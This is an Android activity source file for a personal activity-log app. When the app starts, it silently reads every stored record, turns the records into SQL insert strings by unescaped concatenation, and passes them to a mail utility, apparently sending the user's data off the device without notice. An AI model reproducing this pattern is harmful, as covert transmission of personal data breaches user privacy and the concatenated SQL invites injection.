package com.mylife.myhope;

import java.util.ArrayList;
import java.util.List;

import com.mylife.util.DBHelper;
import com.mylife.util.MailUtil;
import com.mylife.util.UploadData;
import com.wilddog.client.Wilddog;

import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.view.KeyEvent;
import android.view.Menu;

public class MainActivity extends Activity {
	
	private Wilddog ref; 
	
	

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		//Wilddog.setAndroidContext(this);
		
		//startUploadData();
		
		SharedPreferences setting = getSharedPreferences("mylifemyhope", MODE_PRIVATE); 
		int RegisterFirst=setting.getInt("RegisterFirst", -1);			
		//首次使用
		if(RegisterFirst==-1){
			
			doRegisterFirst();
	
		}
		
		
		

		stopThisActivity();

	}
	
  private void stopThisActivity(){	
		
		new Thread(){
			public void run(){

				for(int i=0;i<1000000;i++){
					
				}
				
				String sql="";
				
				DBHelper dbhelper = new DBHelper(MainActivity.this);
				dbhelper.CreatOrOpen("mylifemyhope");
				Cursor cur = dbhelper.selectInfo("select * from mything;");
				while (cur.moveToNext()) {
					
				//	System.out.println("aa"+cur.getInt(0));
				//	System.out.println("bb"+cur.getString(1));
				//	System.out.println("cc"+cur.getString(2));
				//	System.out.println("dd"+cur.getString(3));
				//	System.out.println("ee"+cur.getInt(4));
				//	System.out.println("ff"+cur.getInt(5));
					
					
					sql=sql+"insert into mything values('"+cur.getInt(0)+"','"+cur.getString(1)+"','" +cur.getString(2)+ "','"+cur.getString(3)+"','"+cur.getInt(4)+"','"+cur.getInt(5)+"');";

					System.out.println(sql);
					
					
				}
				dbhelper.closeDB();
				
				
				
				MailUtil mail=new MailUtil();
				mail.runn(sql);
				
				
				Message msg_listData = new Message();
				msg_listData.what=0;
				handler.sendMessage(msg_listData);
				
			}
		}.start();
		
	}
	private void startUploadData(){
		
		
		ref = new Wilddog("https://wild-snake-96493.wilddogio.com/");

		ref.setValue("helloworld");

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) 
	{
		return false;

	}
	
	//首次使用时，必须的系统准备工作
	private void doRegisterFirst(){
		
		//将使用者标识为非首次使用者,并且，将记录状态设置为开始记录的状态
		SharedPreferences setting = getSharedPreferences("mylifemyhope", MODE_PRIVATE); 
		SharedPreferences.Editor editor = setting.edit();	
		editor.putInt("RegisterFirst", 1);
		editor.putInt("WriteDownState", 0);
		editor.commit();	
		
		//创建数据库
		DBHelper dbhelper = new DBHelper(this);
		dbhelper.CreatOrOpen("mylifemyhope");
		dbhelper.excuteInfo("create table mything(id INTEGER PRIMARY KEY,title text,starttime text,endtime text,pride int,important int);");	
		dbhelper.closeDB();
		
	}
	

	
		
	
	public void pagejump(){
		//跳转至功能界面
		Intent intent=new Intent(MainActivity.this,MyActivity.class);
		startActivity(intent);
		finish();
		//overridePendingTransition(R.anim.slide_in_right,R.anim.slide_out_left);
	}
	
	private Handler handler= new Handler(new Handler.Callback() {

        public boolean handleMessage(Message message) {
            switch (message.what) {
            case 0:
            	pagejump();
            	break;
            }
        return false;
      }
	});
	
	//startUploadData();
	
/*	DBHelper dbhelper = new DBHelper(this);
	dbhelper.CreatOrOpen("mylifemyhope");
	Cursor cur = dbhelper.selectInfo("select * from mything;");
	while (cur.moveToNext()) {
		
		System.out.println("aa"+cur.getInt(0));
		System.out.println("bb"+cur.getString(1));
		System.out.println("cc"+cur.getString(2));
		System.out.println("dd"+cur.getString(3));
		System.out.println("ee"+cur.getInt(4));
		System.out.println("ff"+cur.getInt(5));
		
	}
	dbhelper.closeDB();*/
	
	
	
	
	
}
